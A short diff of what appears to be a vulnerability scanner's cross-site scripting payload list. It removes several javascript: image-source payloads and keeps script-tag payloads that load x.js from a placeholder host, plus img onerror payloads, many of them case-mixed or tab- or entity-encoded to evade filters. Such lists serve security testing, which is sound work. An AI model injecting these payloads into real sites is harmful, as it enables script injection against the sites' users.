@@ -9,13 +9,6 @@
 <script[TAB]src=http://__XSS__/x.js></script>
 <ScRiPt[TAB]src=http://__XSS__/x.js></sCrIpT>
 
-<img src=javascript:alert('__XSS__')>
-<img src=javascript:alert("__XSS__")>
-<img src=javascript:String.fromCharCode(0,__XSS__,1)>
-<img src=JaVaScRiPt:String.fromCharCode(0,__XSS__,1)>
-<img src=JaVaS\tcRiPt:String.fromCharCode(0,__XSS__,1)>
-<img src=jav&#x09;ascript:alert('__XSS__');>
-<img src=jav&#x09;ascript:alert("__XSS__");>
 <img src=. onerror=alert("__XSS__")>
 <img src=. onerror=alert('__XSS__')>
 <img src=. onerror=String.fromCharCode(0,__XSS__,1)>
